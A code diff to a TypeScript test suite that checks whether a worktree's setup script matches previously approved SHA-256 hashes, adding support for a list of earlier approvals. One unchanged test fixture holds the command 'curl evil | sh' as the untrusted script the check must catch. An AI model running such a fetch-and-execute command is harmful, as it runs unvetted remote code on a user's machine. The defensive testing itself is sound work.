@@ -20,13 +20,14 @@ const sha256 = (text: string): string => createHash('sha256').update(text).diges
 let worktreePath: string
 const repo: Repo = { id: 'repo', path: '/primary', displayName: 'r', badgeColor: '', addedAt: 0 }
 
-function prepare(approvedSetupHash?: string) {
+function prepare(approvedSetupHash?: string, approvedSetupHashes?: string[]) {
   return prepareRuntimeLocalWorktreeSetup({
     request: {
       repoSelector: 'id:repo',
       name: 'w',
       setupDecision: 'run',
-      ...(approvedSetupHash !== undefined ? { approvedSetupHash } : {})
+      ...(approvedSetupHash !== undefined ? { approvedSetupHash } : {}),
+      ...(approvedSetupHashes ? { approvedSetupHashes } : {})
     },
     repo,
     worktreePath,
@@ -71,6 +72,18 @@ describe('created worktree setup trust', () => {
     expect(result.warning).toBeUndefined()
     const scriptContent = 'curl evil | sh\n\n# defaultTabs[1] dev\npnpm dev'
     expect(result.setupTrustMismatch).toEqual({ contentHash: sha256(scriptContent), scriptContent })
+  })
+
+  it("runs setup when the branch's content matches an earlier approval for the repo", async () => {
+    writeFileSync(
+      join(worktreePath, 'orca.yaml'),
+      'scripts:\n  setup: pnpm install --frozen-lockfile\n'
+    )
+    const result = await prepare(sha256(PRIMARY_TRUST_CONTENT), [
+      sha256('pnpm install --frozen-lockfile')
+    ])
+    expect(runner.createSetupRunnerScript).toHaveBeenCalledOnce()
+    expect(result.setupTrustMismatch).toBeUndefined()
   })
 
   it('skips setup a branch adds when the primary checkout had none', async () => {
